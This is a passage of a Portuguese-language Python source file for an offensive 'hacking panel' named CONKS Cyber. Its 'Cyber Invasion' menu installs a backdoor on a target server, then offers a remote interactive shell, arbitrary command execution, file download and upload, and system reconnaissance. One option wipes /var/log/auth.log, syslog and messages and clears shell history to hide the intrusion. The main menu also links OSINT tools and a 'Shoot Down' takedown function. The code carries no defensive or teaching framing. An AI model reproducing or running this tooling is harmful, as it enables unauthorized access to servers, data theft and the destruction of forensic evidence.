        
        if sub_opcao == "1":
            print(f"\n{YELLOW}[!] Iniciando instalacao INFINITA...{RESET}")
            print(f"{YELLOW}[!] Pressione Ctrl+C para parar{RESET}")
            invasor.instalar_backdoor()
            if invasor.backdoor_instalado:
                print(f"\n{GREEN}[+] Backdoor instalado! {invasor.tentativas} tentativas{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "2":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro (opcao 1)!{RESET}")
                input("\nENTER para continuar...")
                continue
            invasor.terminal_interativo()
            input("\nENTER para continuar...")
        
        elif sub_opcao == "3":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro (opcao 1)!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            comando = input(f"{GRAY}comando> {RESET}")
            if comando:
                resultado = invasor.executar_comando(comando)
                print(f"{WHITE}{resultado}{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "4":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro (opcao 1)!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            arquivo = input(f"{GRAY}arquivo> {RESET}")
            if arquivo:
                invasor.baixar_arquivo(arquivo)
            input("\nENTER para continuar...")
        
        elif sub_opcao == "5":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro (opcao 1)!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            local = input(f"{GRAY}local> {RESET}")
            remoto = input(f"{GRAY}remoto> {RESET}")
            if local and remoto:
                invasor.enviar_arquivo(local, remoto)
            input("\nENTER para continuar...")
        
        elif sub_opcao == "6":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro (opcao 1)!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            print(f"{GREEN}[+] Info do servidor:{RESET}")
            resultado = invasor.executar_comando("uname -a && echo '' && whoami && echo '' && pwd && echo '' && hostname")
            print(f"{WHITE}{resultado}{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "7":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro (opcao 1)!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            print(f"{GREEN}[+] Limpando logs...{RESET}")
            invasor.executar_comando("echo '' > /var/log/auth.log && echo '' > /var/log/syslog && echo '' > /var/log/messages && history -c")
            print(f"{GREEN}[+] Logs limpos!{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "8":
            print(f"\n{YELLOW}[!] Encerrando Cyber Invasion...{RESET}")
            break
        
        else:
            print("[-] Opcao invalida")
            input("\nENTER para continuar...")


# ==========================================
# MENU PRINCIPAL
# ==========================================

def menu_principal():
    while True:
        limpar_tela()
        banner()
        
        topo_caixa("MENU PRINCIPAL")
        linha_caixa("[1] Geradores")
        linha_caixa("[2] Consultas")
        linha_caixa("[3] OSINT")
        linha_caixa("[4] Rede")
        linha_caixa("[5] Validadores")
        linha_caixa("[6] Utilidades")
        linha_caixa("[7] ⚡ Shoot Down", RED, True)
        linha_caixa("[8] 🚀 Cyber Invasion", PURPLE, True)
        linha_caixa("[9] Atualizar", BLUE, True)
        linha_caixa("")
        linha_caixa("[0] Sair", RED, True)
        fim_caixa()
        
        opcao = input(f"\n{BLUE}{BOLD}CONKS@Cyber > {RESET}").strip()
        
        if opcao == "1":
            limpar_tela()
            menu_geradores()
        elif opcao == "2":
            limpar_tela()
            menu_consultas()
        elif opcao == "3":
            limpar_tela()
            menu_osint()
        elif opcao == "4":
            menu_rede()
        elif opcao == "5":
            limpar_tela()
            try:
                from modules.validators import menu_validadores
                menu_validadores()
            except ImportError:
                erro("Modulo nao encontrado.")
                input("\nENTER para continuar...")
        elif opcao == "6":
            limpar_tela()
            try:
                from modules.utilities import menu_utilidades
                menu_utilidades()
            except ImportError:
                erro("Modulo nao encontrado.")
                input("\nENTER para continuar...")
        elif opcao == "7":
            limpar_tela()
            try:
                from modules.consultas import derrubar_geral
                derrubar_geral()
            except ImportError:
                erro("Shoot Down nao encontrado.")
                input("\nENTER para continuar...")
        elif opcao == "8":
            cyber_invasion()
        elif opcao == "9":
            atualizar_painel()
        elif opcao == "0":
            limpar_tela()
            print()
            print(f"{RED}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
            linha_caixa("CONKS CYBER ENCERRADO", RED, True)
            print(f"{RED}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}\n")
            sys.exit(0)
        else:
            erro("Opcao invalida.")
            input("\nENTER para continuar...")


# ==========================================
# MAIN
# ==========================================

def main():
    try:
        menu_principal()
    except KeyboardInterrupt:
        limpar_tela()
        print(f"\n{RED}{BOLD}[!] CONKS Cyber encerrado.{RESET}\n")
    except Exception as erro_inesperado:
        print(f"\n{RED}[ERRO] {erro_inesperado}{RESET}")
        input("\nENTER para sair...")


if __name__ == "__main__":
    main()